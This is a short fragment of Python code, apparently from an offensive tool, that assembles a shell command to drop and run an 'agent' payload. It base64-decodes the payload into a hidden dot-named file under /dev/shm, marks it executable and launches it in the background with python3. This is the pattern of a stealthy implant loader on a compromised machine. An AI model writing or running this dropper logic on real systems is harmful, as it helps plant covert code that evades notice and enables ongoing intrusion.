        write_cmd = f"echo '{b64_agent}' | base64 -d > /dev/shm/.ds_agent && chmod +x /dev/shm/.ds_agent"
        exec_cmd = f"python3 /dev/shm/.ds_agent /dev/shm/.ds_agent &"
        return f"{write_cmd}; {exec_cmd}"


